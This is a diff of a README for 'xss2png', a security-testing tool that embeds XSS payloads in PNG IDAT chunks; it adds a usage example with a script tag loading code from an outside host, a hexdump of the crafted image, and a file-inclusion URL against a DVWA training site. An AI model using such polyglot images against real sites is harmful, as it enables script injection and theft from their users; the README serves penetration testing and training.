@@ -1,6 +1,47 @@
 # xss2png
 PNG IDAT chunks XSS payload generator
 
+A simple tool to generate PNG images with XSS payloads stored in PNG IDAT chunks
+
+### Usage
+
+```
+~/$ python3 xss2png.py -p "<SCRIPT SRC=//XSS.VAVKAMIL.CZ></SCRIPT>" -o xss.png
+               ____                    
+ __  _____ ___|___ \ _ __  _ __   __ _ 
+ \ \/ / __/ __| __) | '_ \| '_ \ / _` |
+  >  <\__ \__ \/ __/| |_) | | | | (_| |
+ /_/\_\___/___/_____| .__/|_| |_|\__, |
+                    |_|          |___/
+ PNG IDAT chunks XSS payload generator
+
+[i] Using payload: <SCRIPT SRC=//XSS.VAVKAMIL.CZ></SCRIPT>
+
+[i] Generating final PNG output
+[!] PNG output saved as: xss.png
+```
+### Example
+
+<img src="xss.png">
+
+```
+~/$ hexdump -c xss.png 
+0000000 211   P   N   G  \r  \n 032  \n  \0  \0  \0  \r   I   H   D   R
+0000010  \0  \0  \0      \0  \0  \0      \b 002  \0  \0  \0   � 030   �
+0000020   �  \0  \0  \0   y   I   D   A   T   x 234   c   �   <   S   C
+0000030   R   I   P   T       S   R   C   =   \   \   X   S   S   .   V
+0000040   A   V   K   A   M   I   L   .   C   Z   >   <   /   S   C   R
+0000050   I   P   T   >       �   �   � 031   �   �   �   =   s   3   �
+0000060 025   �   K   � 217 017   _   s   �   �   �   �   �   �   ?   �
+0000070 227   _   �   X   1   �   �  \t   �   �   ~   �   �   �   g   o
+0000080   4   �   �   v   �   3   2   2 214 202   Q   0  \n   F   �   (
+0000090 030 005   �   ` 024 214 202   Q   0  \n 206 034  \0  \0   4   �
+00000a0   % 002 021   �   �   �  \0  \0  \0  \0   I   E   N   D   �   B
+00000b0   ` 202                                                        
+00000b2
+````
+
+`https://dvwa.capturetheflag.cz/vulnerabilities/fi/?page=../../hackable/uploads/xss.png`
 
 ### Credits
 
@@ -30,24 +71,3 @@ Nathaniel McHugh
 ### Stack Overflow
 
 [PHP shell on PNG's IDAT Chunk](https://stackoverflow.com/questions/49144776/php-shell-on-pngs-idat-chunk)
-
-### Example
-
-`https://dvwa.capturetheflag.cz/vulnerabilities/fi/?page=../../hackable/uploads/xss.png`
-
-```
-vavkamil@localhost:~/Documents/Python/xss2png$ hexdump -c xss.png 
-0000000 211   P   N   G  \r  \n 032  \n  \0  \0  \0  \r   I   H   D   R
-0000010  \0  \0  \0      \0  \0  \0      \b 002  \0  \0  \0   � 030   �
-0000020   �  \0  \0  \0   y   I   D   A   T   x 234   c   �   <   S   C
-0000030   R   I   P   T       S   R   C   =   \   \   X   S   S   .   V
-0000040   A   V   K   A   M   I   L   .   C   Z   >   <   /   S   C   R
-0000050   I   P   T   >       �   �   � 031   �   �   �   =   s   3   �
-0000060 025   �   K   � 217 017   _   s   �   �   �   �   �   �   ?   �
-0000070 227   _   �   X   1   �   �  \t   �   �   ~   �   �   �   g   o
-0000080   4   �   �   v   �   3   2   2 214 202   Q   0  \n   F   �   (
-0000090 030 005   �   ` 024 214 202   Q   0  \n 206 034  \0  \0   4   �
-00000a0   % 002 021   �   �   �  \0  \0  \0  \0   I   E   N   D   �   B
-00000b0   ` 202                                                        
-00000b2
-````
